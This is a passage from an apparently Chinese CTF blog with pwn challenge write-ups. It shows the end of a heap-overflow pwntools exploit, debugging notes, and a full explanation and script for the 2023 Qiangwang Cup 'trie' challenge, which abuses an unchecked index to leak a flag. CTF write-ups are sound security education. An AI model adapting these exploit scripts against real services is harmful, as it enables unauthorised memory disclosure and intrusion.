</span></span><span class="line"><span class="cl"><span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">pr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">menu</span><span class="p">(</span><span class="n">choice</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Choice &gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="n">choice</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">menu</span><span class="p">(</span><span class="s2">&#34;A&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;size &gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">s</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">offset</span><span class="p">,</span><span class="n">length</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">menu</span><span class="p">(</span><span class="s2">&#34;E&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;index &gt;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;offset &gt;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">offset</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;length &gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">s</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">menu</span><span class="p">(</span><span class="s2">&#34;D&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;index &gt;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">offset</span><span class="p">,</span><span class="n">length</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">menu</span><span class="p">(</span><span class="s2">&#34;S&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;index &gt;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;offset &gt;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">offset</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;length &gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x8</span><span class="p">,</span><span class="s2">&#34;chuwei11&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x8</span><span class="p">,</span><span class="s2">&#34;chuwei22&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#mydbg()</span>
</span></span><span class="line"><span class="cl"><span class="n">offset</span><span class="o">=</span><span class="mh">0x0000000000501c68</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000001300000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x00501ce000501ca8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000001b00000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x345231</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x50</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
</div>
</div><h4 class="heading-element" id="后记"><span>后记</span>
  <a href="#%e5%90%8e%e8%ae%b0" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>查看backtrace，发现 #11和#13 是wtoa 中的代码，在#13下断点</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111753.png' alt="Untitled"></p>
<p>当执行到这里时，会发现程序进入了add函数的逻辑，且程序存在异步，所以我们在下一条汇编指令下断点</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111754.png' alt="Untitled"></p>
<p>发现其确实执行了add函数的逻辑，因此猜测0x7ff7d8b9b464所在函数就是主要逻辑</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111755.png' alt="Untitled"></p>
<p>算出偏移，在ida 里面查看在function 17函数中</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111756.png' alt="Untitled"></p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111757.png' alt="Untitled"></p>
<p>那么经过调试也可以发现function 17为主要逻辑函数。</p>
<h3 class="heading-element" id="trie"><span>trie</span>
  <a href="#trie" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>参考链接：https://blog.xmcve.com/2023/12/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2023-Writeup/#title-13</p>
<p><a href="https://www.xp0int.top/posts/2023/12/18/2023-%E5%BC%BA%E7%BD%91%E6%9D%AF-Quals-Writeup-By-Xp0int/#26-trie"target="_blank" rel="external nofollow noopener noreferrer">https://www.xp0int.top/posts/2023/12/18/2023-%E5%BC%BA%E7%BD%91%E6%9D%AF-Quals-Writeup-By-Xp0int/#26-trie<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
<p>简单说一下本地的逻辑，实现了一个简单的路由表：</p>
<ul>
<li>add 功能输入两个ip，每次遇到新ip会插入分支，并且其节点值赋值为tot，然后根据trie中的值，将ip2存放在对应下标的end数组中</li>
<li>show 功能，查找ip 对应的下一跳ip值</li>
<li>get flag ，将flag 存储在secret 处</li>
</ul>
<p>本题漏洞点在于对search 找到的end 下标没做限制，且会将flag 读入到secret处，当v3为0x40 时，就会泄露secret 处的值（每次泄露四字节），也就是flag。</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111758.png' alt="image-20240115002736091"></p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111759.png' alt="image-20240115002811398"></p>
<p>注意到每次insert 时并没有对tot 初始化，那么就给了我们机会让v3的值大于0x40</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111760.png' alt="image-20240115003033484"></p>
<p>首先新增两个ip &ldquo;0.0.0.0&rdquo; &ldquo;255.255.255.255&rdquo;，这样会使tot 的值达到0x40</p>
<p>当ip 的bit为0时，对应的trie 下标为偶数，当ip 的bit 为1时，对应的trie 下班为奇数。</p>
<p>insert 函数首先从下标0开始寻找，如果trie对应的下标处值为0，那么就赋值为 tot，如果有值，那么将该下标赋值给v4，根据v4*2+ip_bit作为下标得到trie[index] 的值，进行判断。</p>
<p>第一次add &ldquo;0.0.0.0&quot;时，trie[0],trie[2],trie[4]&hellip;,trie[62] 被赋值为++tot，</p>
<p>第二次add &ldquo;255.255.255.255&quot;时，会先判断trie[1]，由于其值为0，那么trie[1] 就会赋值为0x21，然后接着判断trie[67]，trie[69],&hellip;&hellip;,trie[127]</p>
<p>此时tot 的值为0x40(也就是trie[127]的值为0x40），那么我们show(&ldquo;255.255.255.255&rdquo;)，就会找到trie[127]处的值0x40，打印end[0x40] 处的值，即flag 的前四字节。</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111761.png' alt="image-20240115004343814"></p>
<p>那么我们如果让show找到trie[index] 处的值为0x41，0x42，0x43，&hellip;&hellip;呢？我们只需add 一个ip，其ip值和（&ldquo;0.0.0.0&quot;或 &ldquo;255.255.255.255&rdquo; 其中之一）有1，2，3，&hellip;&hellip; 位的偏差即可</p>
<p>如果add 128.0.0.0 那么就能打印end[0x41]处的值，add 192.0.0.0 那么就能打印end[0x42] 处的值</p>
<p>如果add 127.255.255.255 那么就能打印end[0x41]处的值，add 63.255.255.255，那么就能打印end[0x42] 处的值</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#context.log_level=&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./trie&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">rn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>  <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">dbg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="o">=</span><span class="kc">None</span>  <span class="p">:</span> <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xff</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">pr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mydbg</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">menu</span><span class="p">(</span><span class="n">choice</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">ru</span><span class="p">(</span><span class="s2">&#34;4. Quit.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">choice</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">hop</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">menu</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Input destination IP:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sl</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Input the next hop:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sl</span><span class="p">(</span><span class="n">hop</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">ip</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">menu</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Input destination IP:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sl</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ru</span><span class="p">(</span><span class="s2">&#34;The next hop is &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decode_flag</span><span class="p">(</span><span class="n">flag</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span><span class="o">=</span><span class="n">flag</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">ascii_representation</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">))</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">flag</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">))[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">ascii_representation</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">leak_list</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;255.255.255.255&#34;</span><span class="p">,</span><span class="s2">&#34;128.0.0.0&#34;</span><span class="p">,</span><span class="s2">&#34;192.0.0.0&#34;</span><span class="p">,</span><span class="s2">&#34;224.0.0.0&#34;</span><span class="p">,</span><span class="s2">&#34;240.0.0.0&#34;</span><span class="p">,</span><span class="s2">&#34;248.0.0.0&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="c1">#leak_list=[&#34;255.255.255.255&#34;,&#34;127.255.255.255&#34;,&#34;63.255.255.255&#34;,&#34;31.255.255.255&#34;,&#34;15.255.255.255&#34;,&#34;7.255.255.255&#34;]</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">leak_ip</span> <span class="ow">in</span> <span class="n">leak_list</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./trie&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">add</span><span class="p">(</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">add</span><span class="p">(</span><span class="s2">&#34;255.255.255.255&#34;</span><span class="p">,</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#mydbg()</span>
</span></span><span class="line"><span class="cl">    <span class="n">add</span><span class="p">(</span><span class="n">leak_ip</span><span class="p">,</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">menu</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">show</span><span class="p">(</span><span class="n">leak_ip</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span><span class="o">=</span><span class="n">ru</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">decode_flag</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 class="heading-element" id="a-rstp"><span>A-rstp</span>
  <a href="#a-rstp" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>待做</p>
<h2 class="heading-element" id="安洵杯-i-soon-x-d0g3"><span>安洵杯 I-SOON x D0g3</span>
  <a href="#%e5%ae%89%e6%b4%b5%e6%9d%af-i-soon-x-d0g3" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 class="heading-element" id="side_channel--initiate"><span>side_channel , initiate!</span>
  <a href="#side_channel--initiate" class="heading-mark">
